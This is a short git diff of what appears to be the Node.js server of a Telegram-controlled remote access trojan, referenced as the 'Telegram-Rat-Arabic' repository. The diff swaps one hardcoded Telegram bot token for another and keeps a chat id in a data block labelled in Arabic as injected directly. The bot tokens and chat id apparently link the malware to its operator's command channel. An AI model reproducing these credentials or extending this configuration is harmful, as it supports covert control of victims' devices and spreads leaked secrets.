@@ -11,10 +11,10 @@ const io = new Server(server);
 const uploader = multer();
 
 // ==========================================
-// 1. البيانات (محقونة مباشرة)
+// 1. البيانات (التوكن الجديد)
 // ==========================================
 const data = {
-    token: "8804148065:AAGS3pj_6QiKcukKOaJOqeT_y0F9O7xWUjA",
+    token: "8976550250:AAHR7uKjBNzlHgoiBxierxbknbCdrtM_YcQ",
     id: "8737619314",
     host: "https://github.com/rshadhackers2/Telegram-Rat-Arabic",
     text: "premium feature",
